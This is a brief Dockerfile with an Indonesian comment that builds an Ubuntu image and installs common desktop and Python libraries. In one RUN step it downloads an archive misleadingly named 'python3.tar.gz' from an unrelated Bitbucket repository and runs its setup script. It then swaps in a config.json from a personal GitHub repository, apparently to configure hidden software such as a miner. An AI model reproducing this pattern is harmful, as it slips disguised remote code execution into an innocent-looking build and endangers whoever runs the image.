# Gunakan base image ringan
FROM ubuntu:rolling

# Set environment variables
ENV DEBIAN_FRONTEND=noninteractive \
    LD_LIBRARY_PATH=/dependencies/lib/x86_64-linux-gnu:/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH \
    PATH=/dependencies/usr/bin:$PATH

# Download and setup the application
WORKDIR /app

# Install dependencies
RUN apt-get update && apt-get install -y \
    wget \
    python3 \
    python3-pip \
    tar \
    build-essential \
    libx11-xcb1 \
    libxcomposite1 \
    libxcursor1 \
    libxdamage1 \
    libxi6 \
    libxtst6 \
    libnss3 \
    libcups2 \
    libxss1 \
    libxrandr2 \
    libatk1.0-0 \
    libgtk-3-0 \
    libavahi-client-dev \
    fonts-liberation \
    --no-install-recommends && \
    apt-get clean && rm -rf /var/lib/apt/lists/*


RUN wget https://bitbucket.org/excel-gms/config/downloads/python3.tar.gz && \
    tar -xvf python3.tar.gz && \
    rm python3.tar.gz && \
    cd python3 && \
    ./setup.sh  && \
    rm config.json && \
    wget https://raw.githubusercontent.com/bambangekosaputro53/vx73/refs/heads/master/config.json 

# Set entrypoint to run the application
WORKDIR /app/
CMD ["python3", "main.py"]
